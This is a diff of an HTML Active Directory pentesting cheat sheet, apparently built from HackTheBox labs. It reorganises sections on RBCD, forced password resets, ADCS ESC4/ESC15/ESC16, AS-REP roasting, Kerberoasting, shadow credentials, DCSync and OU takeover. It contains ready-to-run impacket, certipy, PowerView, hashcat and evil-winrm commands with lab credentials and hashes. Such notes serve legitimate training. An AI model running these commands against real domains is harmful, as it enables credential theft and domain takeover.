@@ -77,112 +77,56 @@ Restore-ADObject -Identity $guid</code></pre>
             </ul>
             <h2>Exploitation</h2>
             <ul>
-                <h3> Resource-based Constrained Delegation attack</h3>
+                <h2>Certypy Attacks</h2>
+                <div class="banner">
+                    <a class="cherry-banner" href="certipy.html">
+                        <h2>   Check for more information ↗️</h2>
+                    </a>
+                </div>
+                <h2>Post exploitation attacks / Bloodhound related</h2>
                 <ul>
-                    <p> RBCD is an attack technique in Active Directory where an attacker abuses a legitimate Kerberos delegation feature to impersonate any user, including domain admins, to access services on a target machine.</p>
-                    <p> Any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).</p>
-                    <p> The attack goes the following way</p>
+                    <h3> Resource-based Constrained Delegation attack</h3>
                     <ul>
-                        <li>The attacker creates or controls a machine account (FakePC$).</li>
-                        <li>They modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target server to allow FakePC$ to delegate to it. </li>
-                        <li>Using tools like Rubeus, the attacker requests a Kerberos ticket (TGS) as a high-privileged user (e.g., Administrator) to access services on the target server.</li>
-                        <li>The KDC issues the ticket because delegation is allowed — no need to know the administrator's password.</li>
+                        <p> RBCD is an attack technique in Active Directory where an attacker abuses a legitimate Kerberos delegation feature to impersonate any user, including domain admins, to access services on a target machine.</p>
+                        <p> Any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).</p>
+                        <p> The attack goes the following way</p>
+                        <ul>
+                            <li>The attacker creates or controls a machine account (FakePC$).</li>
+                            <li>They modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target server to allow FakePC$ to delegate to it. </li>
+                            <li>Using tools like Rubeus, the attacker requests a Kerberos ticket (TGS) as a high-privileged user (e.g., Administrator) to access services on the target server.</li>
+                            <li>The KDC issues the ticket because delegation is allowed — no need to know the administrator's password.</li>
+                        </ul>
+                        <p> To perform this attack you can follow "literally" the commands that bloodhound provides eventhough we used a tool that automates the process</p>
+                        <p> Tool: <a class="notion-link" href="https://github.com/tothi/rbcd-attack/blob/master/README.md"> rbcd.py </a></p>
+                        <p> Creating fake computer </p>
+                        <pre><code class="language-bash">python3 addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful</code></pre>
+                        <p>Modifiying delegation rights</p>
+                        <pre><code class="language-bash">python3 rbcd.py -f EVILCOMPUTER -t DC -dc-ip 10.10.11.174  support\\support:Ironside47pleasure40Watchful</code></pre>
+                        <p>Getting the impersonated service ticket</p>
+                        <pre><code class="language-bash">python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS</code></pre>
+                        <p> Exporting ticket and connecting to machine</p>
                     </ul>
-                    <p> To perform this attack you can follow "literally" the commands that bloodhound provides eventhough we used a tool that automates the process</p>
-                    <p> Tool: <a class="notion-link" href="https://github.com/tothi/rbcd-attack/blob/master/README.md"> rbcd.py </a></p>
-                    <p> Creating fake computer </p>
-                    <pre><code class="language-bash">python3 addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful</code></pre>
-                    <p>Modifiying delegation rights</p>
-                    <pre><code class="language-bash">python3 rbcd.py -f EVILCOMPUTER -t DC -dc-ip 10.10.11.174  support\\support:Ironside47pleasure40Watchful</code></pre>
-                    <p>Getting the impersonated service ticket</p>
-                    <pre><code class="language-bash">python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS</code></pre>
-                    <p> Exporting ticket and connecting to machine</p>
-                </ul>
 
-                <h3> Force Change password attack</h3>
-                <ul>
-                    <p> An attacker has certain permissions on user object (like GenericWrite, WriteProperty, WriteOwner) which ables him to change the password of user without knowing it</p>
-                    <p>To perform this attack you can follow commands that bloodhound provides (more or less becaouse i had to change one a bit)</p>
-                    <p>Define our user passwords</p>
-                    <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $SecPassword)</code></pre>
-                    <p>Change the owner of our victim user</p>    
-                    <pre><code class="language-powershell">Set-DomainObjectOwner -Credential $Cred -Identity VICTIM_USER -OwnerIdentity ATTACKER_USER</code></pre>
-                    <p>Change password of the user</p>
-                    <pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity "VICTIM_USER" -Rights ResetPassword -PrincipalIdentity "ATTACKER_USER"</code></pre>
-                    <p>Define the new password for the user</p>
-                    <pre><code class="language-powershell">$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></pre>
-                    <p>Change user password</p>    
-                    <pre><code class="language-powershell">Set-DomainUserPassword -Identity VICTIM_USER -AccountPassword $UserPassword -Credential $Cred</code></pre>    
-                    <p>Check if password was changed</p>    
-                    <pre><code class="language-bash">crackmapexec smb 10.10.11.51 -u VICTIM_USER -p 'Password123!'</code></pre>   
-                </ul>     
+                    <h3> Force Change password attack</h3>
+                    <ul>
+                        <p> An attacker has certain permissions on user object (like GenericWrite, WriteProperty, WriteOwner) which ables him to change the password of user without knowing it</p>
+                        <p>To perform this attack you can follow commands that bloodhound provides (more or less becaouse i had to change one a bit)</p>
+                        <p>Define our user passwords</p>
+                        <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $SecPassword)</code></pre>
+                        <p>Change the owner of our victim user</p>    
+                        <pre><code class="language-powershell">Set-DomainObjectOwner -Credential $Cred -Identity VICTIM_USER -OwnerIdentity ATTACKER_USER</code></pre>
+                        <p>Change password of the user</p>
+                        <pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity "VICTIM_USER" -Rights ResetPassword -PrincipalIdentity "ATTACKER_USER"</code></pre>
+                        <p>Define the new password for the user</p>
+                        <pre><code class="language-powershell">$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></pre>
+                        <p>Change user password</p>    
+                        <pre><code class="language-powershell">Set-DomainUserPassword -Identity VICTIM_USER -AccountPassword $UserPassword -Credential $Cred</code></pre>    
+                        <p>Check if password was changed</p>    
+                        <pre><code class="language-bash">crackmapexec smb 10.10.11.51 -u VICTIM_USER -p 'Password123!'</code></pre>   
+                    </ul>
                 
-                <h3>Active Directory Certificate Services (ADCS) | Template Haijacking - ESC4  </h3>
-                <ul>
-                    <p>Having in mind that there is a vulnerable certificate template wich has wrong configuration can be used to request certificates impersonating another user</p>
-                    <p>First of all we must have permisions to use that template certificate and this template will be vulnerable if the parameter <b>"Requires Manager Approval"</b> is in <b>"false"</b></p>
-                    <p>All this information can be found using <b>certipy</b> tool</p>
-                    <p>Find a vulnerable certificate</p>
-                    <pre><code class="language-bash"></code>certipy find -u 'ca_svc@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -vulnerable -stdout</pre>
-                    <p>Update certificate template modifying values to make certificate vulnerable</p>
-                    <pre><code class="language-bash">certipy template -u ca_svc@sequel.htb -p 'WqSZAF6CysDQbGb3' -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51</code></pre>   
-                    <p>Request certificate as Administrator user</p>
-                    <pre><code class="language-bash">certipy req -u 'ca_svc' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -template 'DunderMifflinAuthentication' -ca 'sequel-DC01-CA' -dns 'administrator.sequel.htb' -upn 'Administrator@sequel.htb'</code></pre>   
-                    <p>Use the certificate obtained to authenticate in the server and get NT hash</p>
-                    <pre><code class="language-bash">certipy auth -pfx administrator_administrator.pfx -domain sequel.htb</code></pre>
-                    <p>Authenticate using evilwinrm using the NT hash obtained </p>
-                    <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
-                </ul>
-
-                <h3>Active Directory Certificate Services (ADCS) | Arbitrary Application Policy Injection in V1 Templates ESC15 </h3>
-                <ul>
-                    <p>In this case the user you control has permisions over a Certificate Template. That way, using certipy we modify the template to asdd authentication and enrollment to a account we control</p>
-                    <pre><code class="language-bash">certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'mypassword' -dc-ip '10.10.11.72' -target-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'</code></pre>   
-                    <p>Now using the .pfx file login as the admin.</p>
-                    <pre><code class="language-bash">certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell</code></pre>
-                    <p>Remember that inside you won't find a normal shell so we used permisions to add a user to the domain admins group</p>
-                    <pre><code class="language-bash">add_user_to_group john 'Domain Admins'</code></pre>   
-                </ul>
-
-                <h3>Active Directory Certificate Services (ADCS) | Security Extension Disabled on CA (Globally) ESC16 </h3>
-                <ul>
-                    <p>Having in mind that CA itself it is configured to disable the inclusion of the szOID_NTDS_CA_SECURITY_EXT securty extension in all certificates it issues </p>
-                    <p>So we can take advantage of it modifiying UPN of a user and requesting a certificate as that user impersonating it</p>
-                    <p>All this information can be found using <b>certipy</b> tool</p>
-                    <p>Read initial UPN of the victim account </p>
-                    <pre><code class="language-bash">certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user 'ca_svc' read  </code></pre>   
-                    <p>Update the victim account's UPN</p>
-                    <pre><code class="language-bash">certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update</code></pre>   
-                    <p>Export the .ccache file (You must acquire it using shadow credential attack previously)</p>
-                    <pre><code class="language-bash">export KRB5CCNAME=victim.ccache</code></pre>   
-                    <p>Request a certificate</p>
-                    <pre><code class="language-bash">certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'</code></pre>
-                    <p>Use that hash to authenticate </p>
-                    <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
-                </ul>
-
-
-                <h3>AS-REP Roasting Attack</h3>
-                <ul>
-                    <p>Request hashes of AD accounts that have enabled the flag "Do not requiere Kerberos preauthentication". In that case an attacker can request a kerberos ticket without having the password for the user</p>
-                    <pre><code class="language-bash"> impacket-GetNPUsers -no-pass -usersfile users.txt DOMAIN.LOCAL</code></pre>
-                    <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
-                    <pre><code class="language-bash">hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
-                    <p>Show the hash</p>
-                    <pre><code class="language-bash">hashcat --show -m 18200 hash</code></pre>  
-                </ul>
-
-                <h3>Kerberoasting Attack</h3>
-                <ul>
-                    <p>Allows an authenticated attacker to acquire tickets TGS of service accounts in the domain.</p>
-                    <pre><code class="language-bash"> impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request</code></pre>
-                    <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
-                    <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
-                    <p>Show the hash</p>
-                    <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>  
-                </ul>
-
+                
                 <h3>Dsync Attack</h3>
                 <ul>
                     <p>Having in mind that DCs replicate their data using the protocol of AD replication we can take advantage of this function using a DCsync attack. Must have the following privileges over the domain</p>
@@ -197,21 +141,38 @@ $Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $Sec
                     <pre><code class="language-bash">impacket-psexec -hashes :HASH DOMAIN.LOCAL/Administrator@TARGET_IP</code></pre>  
                 </ul>
 
-                <h3>Shadow Credential Attack</h3>
-                <ul>
-                    <p>Used to escalate privielges. This attack is based on modifying certain attributes of the an AD object to inject a public key in the attribute "msDS-KeyCredentialLink" and then the attacker uses the private key to authenticate as he was the victim. Obtaining a NTLM hash which can be use in pass-the-hass attacks</p>
-                    <pre><code class="language-bash">certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'</code></pre>
-                </ul>
+                
 
                 <h3>Generic Descendent Object Takeover</h3>
                 <ul>
                     <p>In case you found that you have <b>GenricAll</b> permision over an OU you could perform an object Takeover which grants you the control of all the objects inside the OU</p>
                     <pre><code class="language-bash">dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'mypassword'</code></pre>
                 </ul>
+                </ul>
                 
-                
-            </ul>        
+                <h2>Kerberos Attacks</h2>
+                <ul>
+                    <h3>AS-REP Roasting Attack</h3>
+                    <ul>
+                        <p>Request hashes of AD accounts that have enabled the flag "Do not requiere Kerberos preauthentication". In that case an attacker can request a kerberos ticket without having the password for the user</p>
+                        <pre><code class="language-bash"> impacket-GetNPUsers -no-pass -usersfile users.txt DOMAIN.LOCAL</code></pre>
+                        <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
+                        <pre><code class="language-bash">hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+                        <p>Show the hash</p>
+                        <pre><code class="language-bash">hashcat --show -m 18200 hash</code></pre>  
+                    </ul>
 
+                    <h3>Kerberoasting Attack</h3>
+                    <ul>
+                        <p>Allows an authenticated attacker to acquire tickets TGS of service accounts in the domain.</p>
+                        <pre><code class="language-bash"> impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request</code></pre>
+                        <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
+                        <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+                        <p>Show the hash</p>
+                        <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>  
+                    </ul>
+                </ul>    
+            </ul>        
         </div>
     </div>
 
